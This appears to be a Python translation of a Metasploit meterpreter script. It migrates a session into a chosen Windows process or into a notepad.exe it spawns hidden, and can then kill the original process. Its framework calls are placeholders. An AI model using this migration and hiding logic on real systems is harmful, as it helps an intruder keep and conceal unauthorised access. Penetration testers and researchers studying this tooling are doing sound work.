#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
If you'd like to improve this script, please try to port it as a post
module instead. Thank you.

Simple example script that migrates to a specific process by name.
This is meant as an illustration.

This is a Python translation of the Ruby meterpreter script.
"""

import argparse
import sys


class MeterpreterMigrate:
    """Meterpreter process migration helper"""
    
    def __init__(self, client):
        """
        Initialize the migration helper
        
        Args:
            client: Meterpreter client session object
        """
        self.client = client
        self.spawn = False
        self.kill = False
        self.target_pid = None
        self.target_name = None
    
    def create_temp_proc(self):
        """
        Creates a temp notepad.exe to migrate to depending on the architecture.
        
        Returns:
            PID of the created process
        """
        # Use the system path for executable to run
        cmd = "notepad.exe"
        # Run hidden
        proc = self.client.sys.process.execute(cmd, None, {'Hidden': True})
        return proc.pid
    
    def print_status(self, msg):
        """Print status message"""
        print(f"[*] {msg}")
    
    def print_good(self, msg):
        """Print success message"""
        print(f"[+] {msg}")
    
    def print_error(self, msg):
        """Print error message"""
        print(f"[-] {msg}")
    
    def migrate(self):
        """Execute the migration process"""
        if self.client.platform != 'windows':
            self.print_error("This script only works on Windows platforms!")
            return False
        
        server = self.client.sys.process.open()
        original_pid = server.pid
        self.print_status(f"Current server process: {server.name} ({server.pid})")
        
        if self.spawn:
            self.print_status("Spawning notepad.exe process to migrate to")
            self.target_pid = self.create_temp_proc()
        
        if self.target_name and not self.target_pid:
            # Get PID by process name
            self.target_pid = self.client.sys.process[self.target_name]
            if not self.target_pid:
                self.print_status(f"Could not identify the process ID for {self.target_name}")
                return False
        
        if not self.target_pid:
            self.print_error("No target PID specified!")
            return False
        
        try:
            self.print_good(f"Migrating to {self.target_pid}")
            self.client.core.migrate(self.target_pid)
            self.print_good("Successfully migrated to process")
        except Exception as e:
            self.print_error("Could not migrate into process.")
            self.print_error(str(e))
            return False
        
        if self.kill:
            self.print_status(f"Killing original process with PID {original_pid}")
            self.client.sys.process.kill(original_pid)
            self.print_good(f"Successfully killed process with PID {original_pid}")
        
        return True


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Migrate meterpreter to a specific process',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Migrate to PID 1234:
    python3 migrate.py -p 1234
  
  Spawn new process and migrate:
    python3 migrate.py -f
  
  Migrate to first explorer.exe:
    python3 migrate.py -n explorer.exe
  
  Migrate and kill original process:
    python3 migrate.py -p 1234 -k
        """
    )
    
    parser.add_argument('-f', '--spawn', action='store_true',
                        help='Launch a process and migrate into the new process')
    parser.add_argument('-p', '--pid', type=int,
                        help='PID to migrate to')
    parser.add_argument('-k', '--kill', action='store_true',
                        help='Kill original process')
    parser.add_argument('-n', '--name', type=str,
                        help='Migrate into the first process with this executable name (e.g., explorer.exe)')
    
    args = parser.parse_args()
    
    # In case no option is provided show help
    if not any([args.spawn, args.pid, args.name]):
        parser.print_help()
        return 1
    
    # NOTE: In actual use, this would get the client from the framework
    # For now, this is a placeholder showing the structure
    print("NOTE: This is a translated script that requires meterpreter framework integration")
    print("The following would be executed:")
    
    if args.spawn:
        print("  - Spawn notepad.exe")
    if args.pid:
        print(f"  - Migrate to PID: {args.pid}")
    if args.name:
        print(f"  - Migrate to process: {args.name}")
    if args.kill:
        print("  - Kill original process after migration")
    
    # Placeholder for actual implementation
    # client = get_meterpreter_client()
    # migrator = MeterpreterMigrate(client)
    # migrator.spawn = args.spawn
    # migrator.kill = args.kill
    # migrator.target_pid = args.pid
    # migrator.target_name = args.name
    # success = migrator.migrate()
    # return 0 if success else 1
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
